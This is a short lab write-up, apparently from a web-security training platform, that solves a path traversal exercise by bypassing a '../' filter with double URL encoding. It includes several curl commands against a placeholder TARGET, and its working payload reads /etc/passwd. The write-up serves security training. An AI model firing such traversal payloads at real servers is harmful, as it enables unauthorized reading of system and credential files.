# File path traversal, traversal sequences stripped with superfluous URL-decode — Practitioner

**Status:** Solved

---

## Goal

Bypass a filter that blocks `../` and then URL-decodes the input. Use double encoding to exploit the vulnerability.

---

## Steps (simple & complete)

1. **Find the vulnerable endpoint**
   - Browse any product page and check how images load:
```
   GET /image?filename=15.jpg
```

2. **Test normal traversal**
   - Try basic traversal:
```bash
   curl -s "https://TARGET/image?filename=../../../etc/passwd"
```
   - This fails because the app blocks `../`.

3. **Test single URL encoding**
   - Try URL-encoded version (`%2e%2e%2f` = `../`):
```bash
   curl -s "https://TARGET/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```
   - This also fails because the app decodes it and then blocks it.

4. **Understand the filter logic**
   - The app first checks for blocked sequences
   - Then performs URL-decoding
   - This creates an opportunity: double-encode to bypass the initial check.

5. **Use double URL encoding**
   - `../` → `%2e%2e%2f` (first encoding)
   - `%2e%2e%2f` → `%252e%252e%252f` (second encoding)
   - Use the double-encoded payload:
```bash
   curl -s "https://TARGET/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
```

6. **How it works**
   - First check: sees `%252e%252e%252f` (looks harmless, passes filter)
   - URL decode: becomes `%2e%2e%2f`
   - Second decode: becomes `../`
   - Final path: `../../../etc/passwd`

7. **Verify success**
   - If you see the file contents, the double encoding bypass worked.

8. **Lab completion**
   - The lab automatically marks as solved when `/etc/passwd` is successfully retrieved.

---

## Example

- Vulnerable endpoint: `GET /image?filename=15.jpg`
- Working payload:
```bash
curl -s "https://TARGET/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
```

---

**Lab 4 Complete ✓**